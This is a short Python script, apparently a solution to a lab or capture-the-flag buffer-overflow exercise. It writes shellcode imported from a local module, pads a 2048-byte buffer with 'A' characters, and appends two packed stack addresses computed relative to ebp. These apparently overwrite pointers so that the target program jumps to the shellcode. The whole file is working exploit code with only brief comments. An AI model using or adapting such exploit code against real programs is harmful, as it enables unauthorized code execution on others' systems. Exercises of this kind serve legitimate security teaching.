from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write(shellcode)				
print("A" * (2048 - len(shellcode)), flush=True, end='')	#filling the rest of the buffer with A(buffer overflow) taking into account p,a 
sys.stdout.buffer.write(pack("<I",0xfffe9038 - 0x810))		# a w.r.t ebp
sys.stdout.buffer.write(pack("<I",0xfffe9038 + 4))		# p w.r.t ebp

